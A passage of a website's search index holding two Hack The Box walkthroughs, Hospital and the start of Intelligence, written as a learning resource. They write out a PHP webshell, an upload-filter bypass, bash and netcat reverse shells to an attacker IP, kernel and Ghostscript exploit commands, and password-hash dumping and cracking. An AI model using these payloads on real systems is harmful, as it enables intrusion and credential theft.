Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=hospital,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. SMB 445: I try guest \u0026amp; null sessions to enumerate SMB they have been disabled: DNS 53: I run dnsenum, to enumerate any interesting records: I get duplicate entries, but looking at my hosts file there is no listing for these so unsure what is going on here….. Nothing of note HTTPS 443: Web Mail Service Discovery: There is a hospital webmail application running here: Looking at Wappalyzer: We can see the webmail is running on a service called \u0026ldquo;RoundCube\u0026rdquo; I do a quick search for RoundCube CVE\u0026rsquo;s: https://www.cvedetails.com/vulnerability-list/vendor_id-8905/Roundcube.html I find this RoundCube command injection vulnerability: We will keep hold of this but continue to enumerate Enumerating the Tech Stack of the Web-Mail Server: Enumerate the Tech Stack: whatweb https://$box Directory Busting HTTPS Using Feroxbuster: feroxbuster -u https://10.129.229.189 -k +Note+: If the domain uses self-signed certs we have to pass the -k flag as otherwise ferox will not run as it rejects self-signed certs. We can see that there is a phpmyadmin page running, which is a good target, however it\u0026rsquo;s a 403 so we cannot get access to directly. However we may be able to gain access via the web-proxy that is running? https://10.129.229.189/skins/elastic/watermark.html https://10.129.229.189/skins/elastic/images/logo.svg https://10.129.229.189/program/js/common.min.js https://10.129.229.189/skins/elastic/ui.min.js https://10.129.229.189/program/js/jstz.min.js https://10.129.229.189/skins/elastic/images/favicon.ico https://10.129.229.189/plugins/jqueryui/themes/elastic/jquery-ui.min.css https://10.129.229.189/phpmyadmin https://10.129.229.189/skins/elastic/styles/styles.min.css https://10.129.229.189/skins/elastic/deps/bootstrap.bundle.min.js https://10.129.229.189/program/js/jquery.min.js https://10.129.229.189/program/js/app.min.js https://10.129.229.189/skins/elastic/deps/bootstrap.min.css https://10.129.229.189/plugins/jqueryui/js/jquery-ui.min.js https://10.129.229.189/ https://10.129.229.189/installer =\u0026gt; https://10.129.229.189/installer/ https://10.129.229.189/examples https://10.129.229.189/installer/images =\u0026gt; https://10.129.229.189/installer/imag Attempting to Login: I attempt to login and look at the request in burp: I am getting an unauthorized response, I cannot see why, potentially a red-herring? HTTP-PROXY 8080: Enumerating the Tech Stack of the proxy server: Looking at whatweb this host appears to be running on Ubunutu: whatweb http://$box:8080 This is interesting as it would seem this is running in a VM, which makes sense as there is a hyper V instance (I think), running as port 2179 vmrdp is running. Directory Busting Web Proxy Using Feroxbuster: All of these pages are not directly accessible: http://10.129.229.189:8080/ http://10.129.229.189:8080/images/ http://10.129.229.189:8080/css/ http://10.129.229.189:8080/uploads/ http://10.129.229.189:8080/fonts/ http://10.129.229.189:8080/js/ http://10.129.229.189:8080/vendor/ http://10.129.229.189:8080/vendor/jquery/ http://10.129.229.189:8080/images/icons/ http://10.129.229.189:8080/vendor/animate/ Web Mail Service Discovery on 8080: Webmail login page: I try and enter basic creds of admin:admin however these do not work: Looking at Wappalyzer: We can see the webmail is running also on a service called \u0026ldquo;RoundCube\u0026rdquo; Creating an account: I can see that there is the option to create an account:\nI try admin:admin123:\nThis lets me know that there is an admin user. I check for default credentials for RoundCube and find this post on their support forums:\nThis lets me know that there is no default admin user, so the one that is on here is intentionally set. I make an account:\nbloodstiller:bl00dst1113r Discovering An Upload Portal: After logging in I am given access to an upload portal:\nI test to see what sort of file types it is expecting:\nI can see it\u0026rsquo;s expecting image types however it is running on .php which means we can potentially upload a php webshell. I Upload a valid picture to see what happens:\nI then try and access it via the uploads directory which we found earlier when dirbusting: It is not accessible. Looking at the request and response in burp we can see that it was a valid upload: This leads me to believe the uploaded file is being processed/renamed on upload. Future bloodstiller here, no this is wrong. THis is because I put .jpg in my request instead of .jpeg. Always copy and paste guys Uploading a webshell:\nI create a php webshell: \u0026lt;?php system($_REQUEST[\u0026quot;cmd\u0026quot;]); ?\u0026gt; I upload the php webshell: It\u0026rsquo;s caught and errors out: I check if there is anything telling in the error response, but none that I can see: I append .jpg to my php webshell to see if I can bypass the upload restrictions: It\u0026rsquo;s a success: This is good as it means filtering is only happening in the browser, which means we can see if any other extensions will be considered valid and enable us to upload a webshell. Fuzzing for valid extensions: I initiate another upload and capture it in burp \u0026amp; send to intruder: I set the extension as my injection/fuzzing point: I use the web-extensions.txt list from Seclists: Looking at the results, we can see that the extension phar has a success.php response: What this means is we should be able to append .phar to our shell and have it bypass any restrictions. What is a phar file? A PHAR file is a packaged PHP Archive so it can be read and processed \u0026amp; executed by the server that is running PHP. I want to point out that there are also other options here that also had a valid success response, I am just opting to use .phar as I have had the most experience with this type of file. Trying to get a web-shell by bypassing file-upload restrictions: I rename my shell to shell.phar for no other reason than convenience. In an engagement I would give this a hashed long name so no-one else could stumble upon it. I upload it, it uploads successfully. I attempt to use \u0026amp; run it \u0026amp; nothing….. I try without arguments too \u0026amp; nothing: Back to the drawing board…. Enumerating the PHP Server Some More: So what do we know?\nIn situations like this, it\u0026rsquo;s good to go over what we do know to be true about the host \u0026amp; service: We know we can upload a file. We know there is a file uploads folder, where we (believe these files are stored) We know we can upload files with the .phar extension. We know that the server is running php Let\u0026rsquo;s enumerate the server more and see if we can find anymore information about the php service running:\nAs we know the above we can actually create a file that will call the phpinfo function when uploaded \u0026amp; executed via the web server echo \u0026quot;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026quot; \u0026gt; phpinfo.phar This script will display all the PHP configuration details, including version, loaded extensions, server info, and more. I upload it and visit the url:\nWe can see it works, however there is also a list of disabled functions and these functions are what we would typically utilize for web-shells; however weevely has the ability to bypass these function restrictions using it\u0026rsquo;s audit_disablefunctionbypass feature!! So we can use this to get a webshell https://github.com/epinna/weevely3/wiki/Bypass-disabled-system-shell-functions-via-mod_cgi-and-.htaccess 2. Foothold: Using Weevley To Get A Web Shell: Generate our Shell:\nWeevly is built into Kali by default so we can just call it as so: weevely generate \u0026lt;password\u0026gt; \u0026lt;outPutFile\u0026gt; weevely generate bl00dst111er medrec.phar I upload the shell:\nAccessing the Shell:\nsudo weevely http://hospital.htb/uploads/medrec.phar bl00dst111er So as you can see below there are alot of errors. I actually did some troubleshooting with this. I ended up cloning the repo, setting up a python venv, installing all deps to that and trying again \u0026amp; I still go the same errors and it would not run with sudo. So if in doubt just run with sudo and it should work. Running Commands:\nWe need to run an initial command to get access to the shell: Just to make it clear, we are in the VM that is running ubuntu. So we need to find a way to escape or gather information we can use elsewhere. I try and run some commands but it gets a 404 and times out:\nI did notice that when trying to access my phpinfo enumeration file that it also times out, which leads me to believe there is some sort of timeout in place for uploaded files. Getting around the timeout Using Weevely\u0026rsquo;s built in reverse shell: I believe the easiest way to get around the time out will be to on connection immediately trigger a manual reverse shell back to ourselves from the weevley shell and background the task to ensure the connection remains. Prepare my listener:\nnc -nvlp 443 +Note+: I use 443 so the traffic at least looks legitimate. Prepare my reverse shell statement to paste into the weevley shell:\nbash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.27/443 0\u0026gt;\u0026amp;1' +Note+: I do this as it\u0026rsquo;s time-sensitive \u0026amp; I want to easily copy and paste as opposed to typing something out and getting a type-o. Connect via weevley:\nsudo weevely http://10.129.229.189:8080/uploads/rec.phar bl00dst111er Trigger the reverse shell:\nCaught: +Note+: Full transparency here, I tried multiple ways to get this to work, including the below. However the only way I could get a connection was using the above sub-shell method. I am showing you this as I want you to know that sometimes you have to just keep trying to find a viable path to make things work. /usr/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.27/443 0\u0026gt;\u0026amp;1 /bin/sh -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.27/443 0\u0026gt;\u0026amp;1 nc 10.10.14.27 443 -e /usr/bin/sh \u0026amp; nc 10.10.14.27 443 -e /usr/bin/bash \u0026amp; nc 10.10.14.27 443 -e /bin/bash \u0026amp; I also tried weevleys inbuilt reverse-tcp shell and that would not work Detailed Breakdown Of The Reverse Shell: Bash Sub-Shell:\nbash -c Runs the command bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.27/443 0\u0026gt;\u0026amp;1 within a new instance of the bash shell. The -c option allows us to pass a string as a command to be executed. bash -i Launches an interactive instance of the Bash shell. Redirection Operators:\n\u0026gt;\u0026amp;\nRedirects both standard output stdout and standard error stderr to the target in this case, our attack host, /dev/tcp/10.10.14.27/443. /dev/tcp/\nThis is a special file in Linux systems that allows network communication. By using /dev/tcp/ with an IP address and port 10.10.14.27:443, the shell sends its output to our attack host at that IP and port. This essentially establishes a TCP connection to our attack machine 10.10.14.27 on port 443. 0\u0026gt;\u0026amp;1:\nRedirects standard input stdin from the same file descriptor as standard output stdout. This allows the shell to receive commands from our attack machine and execute them. Finding Mysql Creds in config.php: I check the config.php file in /var/www/html \u0026amp; find the creds for the msql instance hardcoded in the file: We know there is a db called hospital too, so this is worth checking out. Understanding the Upload Mechansim: Uploads Folder:\nI check the uploads folder \u0026amp; as suspected it is now empty, leading me to believe there is some sort cron job clearing these files. This is interesting find though as it means cron jobs are running, so that is something we should enumerate further. Reading upload.php\nIt\u0026rsquo;s always interesting to look at the logic behind upload mechanisms once we exploit them, I find as a means to learn. Looking at the code we can see they have opted for a blacklist approach to extensions, black-lists can work however as we have seen just missing one extension render them useless. Defenders have to get it right 100% of the time, as attackers we only need to be right once. A better approach would be to have a white-list of extensions, so that the upload page only accepts uploads for say .pdf files. This would eliminate this attack vector and also be far easier to maintain from an administration point of view. Trying to connect to the mysql instance: I verify the mysql server is running \u0026amp; accessible from the VM (it has to be as it\u0026rsquo;s not running on the bare-metal host) netsat -tuln I try various ways to initiate a connection to it but each time it fails in some way: These are only a few of many different attempts \u0026amp; ways I tried to use to connect to the mysql instance, however none of them worked. Discovering another User: Finding Dr Williams User:\nI find a user drwilliams in the /home folder however their home folder in inaccesible. Checking etc/passwd see that the users name is actually Lucy Williams\nI take a note of this as it may be used later. I try cred stuffing the found creds so far but there are no hits:\nDiscovering a Tmux Session: I see that there appears to be a tmux session listed in /tmp. Existing tmux sessions can be an easy privesc path as if they are set to run permnantley we can attach them \u0026amp; then scroll through whatever commands were entered previously, these could be things such as clear text creds so it\u0026rsquo;s always good to check existing sessions. I Try and attach the session however when I try and initiate tmux to enter this session it does not work due to the nature of the terminal: Before you ask, upgrading to python terminal does not work nor does upgrading the stability of the terminal using script I did also try and create a meterpreter shell which connected however I was still unable to attach the TMUX session. 3. VM Privilege Escalation: Discovering the Kernel is vulnerable to exploitation: I list the kernel version: uname -a After some quick searching I find that this actually vulnerable to this exploit which will allow us to privesc: https://github.com/Synacktiv/CVE-2023-35001 Building the \u0026amp; transferring the exploit: I clone the exploit:\ngit clone https://github.com/synacktiv/CVE-2023-35001.git Following the instructions I build it:\nmake This leaves me with a file called lpe.zip that I can transfer to the target. Checking the host it doesn\u0026rsquo;t have zip or unzip:\nLuckily the exploit retains the exploit \u0026amp; wrapper files need so we can just transfer those to the target. Using the CVE-2023-35001 exploit to privesc to root: I make the exploit \u0026amp; wrapper executable:\nchmod +x exploit chmod +x wrapper I trigger the exploit:\n./exploit Enumerating as Root: SSH: I check drwilliams \u0026amp; root .ssh folders but they are empty :( Connecting to the mysql instance as root! Connect:\nmysql -u root -p'\u0026lt;Redacted\u0026gt;' List the databases:\nshow databases; Select the hospital Database:\nuse hospital; Show the tables in the hospital database:\nshow tables; It has a users table so we could get a some creds! Show columns from the users tables\nshow columns from users; Show the contents of the columns:\nselect * from users; Cracking the hashes admin hash: I check the hash type by using: https://hashes.com It says they are bcrypt $2*$, Blowfish (Unix) Checking hashcats website we can see these hashes use mode 3200\nI start hashcat \u0026amp; crack the admin hash almost immediately:\nhashcat -m 3200 Mysql-Hashes.txt ~/Wordlists/rockyou.txt I also get the patient hash. I try cred stuffing with these and accessing the webmail but no access. Onto the next thing….. Dumping Shadow Hashes: As I am root I can dump the /etc/shadow:\nI copy the /etc/passwd \u0026amp; /etc/shadow locally. I use unshadow to extract the hashes: unshadow passwd shadow \u0026gt; unshadowed.hashes I am going to focus on cracking the drs hash as I already have access to the root account \u0026amp; this is a VM so unless I can perform a VM escape a lateral move seems like the logical approach.\nVM escapes are possible but as far as I am aware, more advanced than this box is labelled. Cracking Dr Williams Hashed Password: I find out the format of the hash on hashes.com\nIt\u0026rsquo;s sha512crypt: Checking hashcat\u0026rsquo;s website I can see that it\u0026rsquo;s mode 1800:\nI copy the hash to a seperate file \u0026amp; start cracking with hashcat:\nhashcat -m 1800 drhash ~/Wordlists/rockyou.txt It cracks!! I try the creds on SMB but no use again. Accessing Dr Williams Email: I try all the creds in the webmail portal \u0026amp; get in Dr Williams creds.\nPassword re-use, naughty, naughty Dr Williams. I find that the RoundCube version running is 1.6.4\nI can see that the one email in the inbox is from drbrown, I add their name to my found usernames list.\nGhostScript file request:\nIn the email the Dr Brown is requesting a file in the .eps format for GhostScript from Dr Williams. Looking into GhostScript I can see it\u0026rsquo;s an interpreter for PostScript (PS) and Portable Document Format (PDF) files, enabling viewing, printing, and converting them. Finding a GhostScript EPS CVE:\nLooking online it is possible to trigger a reverse shell via a malicious .eps file with GhostScript. This would mean if we can get Dr Brown to open it we can get a reverse shell. https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection?tab=readme-ov-file 4. Host Foothold: Gaining Access to the host via Malicious .eps GhostScript Exploit: Looking at the readme for the GhostScript public exploit CVE_2023_36664, we have alot of options. We cannot use the standard --revshell command as that is for when executed on a unix host only. However we can generate our own payload and have this placed in an eps file.\nI use https://revhells.com to generate a powershell reverse shell and base64 encode it:\nI use the exploit to generate the malicious .eps file:\npython3 CVE_2023_36664_exploit.py -g -p \u0026quot;\u0026lt;payload\u0026gt;\u0026quot; -x eps I start my nc listener:\nnc -nvlp 53 Respond in the email client \u0026amp; attach the malicious.eps file:\nWithin seconds I have a reverse shell:\n+Note+: This is one of the coolest boxes I have done. The creativity is amazing.\nFinding Hard-Coded Creds In ghostscript.bat file: As soon as I connect I see there is a file called ghostscript.bat in the Documents folder of drbrown.\nLooking at the contents I can see that it has hard-coded credentials:\nI verify these are valid with netexec \u0026amp; evil-winrm:\nAs they are valid with evil-winrm this gives us an easy way for re-entry onto the host. I check my privs:\nI see I have the ability add workstations to the domain. If I have delegation rights this could be a valid attack path. Lets run bloodhound to find out. Running Bloodhound:\npython3 bloodhound.py -dc dc.hospital.htb -c All -u $user -p $pass -d hospital.htb -ns $box I find that our user is part of the Remote Desktop users group:\nHowever I do not have delegation privs. Let\u0026rsquo;s connect to the host and see if we can find anything there. 3. Privilege Escalation: Connecting Via RDP to the target: As we are part of the Remote Desktop Users Group, I connect to the host: xfreerdp /v:$box /u:$user /p:$pass Capturing Credentials from the Selenium WebDriver: Hard Coded Creds In Internet Explorer:\nAs soon as I login, an internet explorer window opens and it looks like the credentials are being entered in by a script, manually typing each character in. I wait a minute and process begins again, which means it\u0026rsquo;s looping. Discovering Selenium is being used on the host for automating credential entry:\nInvestigating further when the loop starts again a powershell window opens and displays the below. The script is using \u0026ldquo;selenium\u0026rdquo; which is a framework used for automating web browsers. Redirecting the Selenium output to capture the Adminsitrator Username \u0026amp; Password:\nAs the creds are being manually typed, all we have to do is have the text redirect to us to something we control to capture the credentials. On the next loop I open notepad and when it starts entering the creds in internet explorer I select Notepad \u0026amp; it starts typing the creds there 4. Ownership: I check the Administrator creds to see if they have been re-used:\nBoom, we have ownership I connect via evil-winrm \u0026amp; I get the root flag:\nIt wouldn\u0026rsquo;t be full ownership unless I dump the ntds.dit file to get all the hashes now would it?\nLessons Learned: What did I learn? I learned about using the GhostScript eps exploit, I was not even aware that existed so that was cool. I learned that you can re-direct selenium output (this is important as I have used selenium in previous projects, never to enter anything sensitive but this interesting none-the less) I learned not to do boxes when I get sleepy. I got caught for a long time looking for the correct foothold. I also learned that you can be really creative when making these boxes, this one was honestly amazing. What silly mistakes did I make? I was sleepy when I started so overlooked a pretty obvious foothold/entrypoint even though it was staring me in the face. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/hospital-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/roundcube\/": {
        "title": "RoundCube",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/roundcube\/"
    },
    
    "http:\/\/localhost:1313\/tags\/selenium\/": {
        "title": "Selenium",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/selenium\/"
    },
    
    "http:\/\/localhost:1313\/tags\/dns\/": {
        "title": "DNS",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/dns\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/intelligence-box\/": {
        "title": "Intelligence HTB Walkthrough",
        "tags": ["Box","HTB","Medium","Active Directory","Windows","Kerberos","KCD","DNS",],
        "content": "Hack The Box Intelligence Walkthrough/Writeup: https://app.hackthebox.com/machines/Intelligence How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 16:27:13 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-27 16:27 BST Nmap scan report for 10.129.95.154 Host is up (0.039s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP\nkali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh took 10s 🕙 16:27:28 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-27 16:28 BST Nmap scan report for 10.129.95.154 Host is up (0.078s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Intelligence 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-27 22:30:53Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-09-27T22:32:28+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-09-27T22:32:31+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-09-27T22:32:30+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2024-09-27T22:32:27+00:00; +7h00m00s from scanner time. 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49691/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49692/tcp open msrpc Microsoft Windows RPC 49710/tcp open msrpc Microsoft Windows RPC 49713/tcp open msrpc Microsoft Windows RPC 49737/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-09-27T22:31:48 |_ start_date: N/A OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 255.43 seconds Discoveries:\nDNS 53: As this is a Domain Controller it is running the DNS service. I run dnsenum to enumerate the DNS service: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt intelligence.htb It is just the standard entries for any AD Domain. LDAP 389: Using LDAP anonymous bind to enumerate further:\nIf you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.11.9 4GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 17:36:54 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.95.154 with SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=intelligence,DC=htb CN=Configuration,DC=intelligence,DC=htb CN=Schema,CN=Configuration,DC=intelligence,DC=htb DC=DomainDnsZones,DC=intelligence,DC=htb DC=ForestDnsZones,DC=intelligence,DC=htb We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=intelligence,DC=htb ldapServiceName: intelligence.htb:dc$@INTELLIGENCE.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: Any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intelligence,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. SMB 445: I check if we can use a null session or guest session to connect to the SMB Share: HTTP 80: It\u0026rsquo;s running a mostly unfinished website.\nInspecting the website I the links for two documents \u0026amp; they have a similar naming structure YYYY-DD-MM-upload.pdf \u0026amp; are stored in the documents folder, this naming structure can easily be fuzzed using FFUF.\nI do some dirbusting with feroxbuster and can see that there are multiple other entries in the documents folder:\nferoxbuster -u http://$box Fuzzing for Uploads using FFUF (Finding IDORs): Creating a Simple Wordlist:\nAll of seclists are very long so I make a new list from 0-32 using a simple python terminal \u0026amp; save that to my personal wordlists list: +Note+: It\u0026rsquo;s really important we put the leading zero\u0026rsquo;s by utilizing format string literals as otherwise number\u0026rsquo;s 1-9 will miss the leading zeros and as we can see this format is utilizing 2 digits to represent the month \u0026amp; day so we would miss potential entries. Running FFUF:\nffuf -w ~/Wordlists/45.06-CustomWordlists/numbersDays-1-31.txt:FIRST -w ~/Wordlists/45.06-CustomWordlists/numbersDays-1-31.txt:SECOND -u http://10.129.95.154/Documents/2020-FIRST-SECOND-upload.pdf I get ALOT of hits. To make things easier I am going to script a way to easily download all of these files. Explanation of Vulnerability Indirect Object Reference (IDOR): This type of vulnerability is called an Indirect Object Reference or (IDOR)\nIt is a security flaw where an application exposes a reference to an internal implementation object, such as a file, directory, or database key, without proper authorization checks.\nCommon Examples:\nExposed database record IDs in URLs or form fields that can be manipulated to access other users\u0026rsquo; data. Direct references to files or directories in the web server that can be accessed or downloaded without proper authentication. This is what we took advantage of, just by seeing that there were two PDF\u0026rsquo;s with the same naming structure of YYYY-MM-DD-upload.pdf we were able to fuzz the website and find other files that we should not be able to access and access them. Prevention Methods:\nImplementing proper access control checks to ensure users can only access objects they are authorized to. Avoiding the use of direct object references in user-accessible inputs whenever possible. Using indirect reference maps or tokens to reference internal objects. Further reading on IDORs:\nHow to find IDORs: https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489 OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References Scripting a simple mass down-loader to download the PDF\u0026rsquo;s: Here is my script for mass downloading the files from site. It\u0026rsquo;s simple in that it essentially fuzzes for every day \u0026amp; month combination \u0026amp; depending on the HTTP response will download the file or print a message saying file not found. import requests # Days from 01 to 31 days = [str(day).zfill(2) for day in range(1, 32)] # Months from 01 to 12 months = [str(month).zfill(2) for month in range(1, 13)] # Loop through days and months for d in days: for m in months: # Construct the URL: url = f\u0026#34;http://10.129.95.154/Documents/2020-{m}-{d}-upload.pdf\u0026#34; response = requests.get(url) # Check if the request was successful: if response.status_code == 200: print(f\u0026#34;Downloading {url}\u0026#34;) # Save the file locally \u0026amp; print message: file_name = f\u0026#34;2020-{m}-{d}-upload.pdf\u0026#34; with open(file_name, \u0026#39;wb\u0026#39;) as file: file.write(response.content) # If we get a 404 response print that no file was found: elif response.status_code == 404: print(f\u0026#34;No file found at {url}\u0026#34;) Converting the PDF\u0026rsquo;s to text using pdftotext for easier processing: Looking at the results I can see that there is 86 files in there, which is ALOT to manually go through.\nInstall poppler-utils:\nsudo apt-get install poppler-utils Convert the files:\nfor p in *pdf; do pdftotext $p; done This is a simple for loop that iterates through the list of pdfs in the folder and runs pdftotext on them to convert them. Finding a default password \u0026amp; a username in a pdf: After going through the converted pdf\u0026rsquo;s I find a clear-text password And a username from an IT user called \u0026ldquo;Ted\u0026rdquo;: Unfortunately this is not a valid username in AD it should be first.lastname for SAM Accounts. Extracting Usernames from the creator field of the PDF\u0026rsquo;s: PDF Metadata Collection:\nWhen creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system. System Environment Variables:\nThe logged-in Windows username is part of system environment variables. This is often used to populate fields like \u0026ldquo;Creator\u0026rdquo; in the PDF document. Program Defaults:\nBy default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user. Tracking Ownership:\nThis feature helps track the original creator or author of a document for auditing or document management purposes. Reading the data:\nWe can read the data using the tool exiftool I believe it is installed by default in kali It also means we can extract valid SAM account names from the PDFs! Command to extract usernames from pdf metadata \u0026amp; save to a list:\nexiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq \u0026gt; userNames.txt Looking at our results we can see we have valid 